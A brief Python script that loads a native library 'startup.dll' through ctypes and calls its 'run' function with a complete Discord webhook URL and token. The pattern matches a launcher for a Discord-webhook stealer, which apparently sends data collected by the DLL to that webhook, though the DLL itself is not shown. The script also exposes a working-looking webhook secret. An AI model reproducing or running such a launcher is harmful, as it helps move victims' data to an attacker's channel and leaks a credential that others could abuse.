import ctypes

# Load the DLL
mylibrary = ctypes.CDLL('./startup.dll')

# Define the argument type as a string (CString)
mylibrary.run.argtypes = [ctypes.c_char_p]

print(dir(mylibrary))

# Call the main function with a string argument
mylibrary.run(b"https://discord.com/api/webhooks/1302674995280871545/fsmwXtFfChCn7ktcF3Gy8Pu0mv8YeOv9Izht3yC7Kstm5gHsa8ovmSvepksTpKXc7ICe")  # The argument must be a byte string (b"")
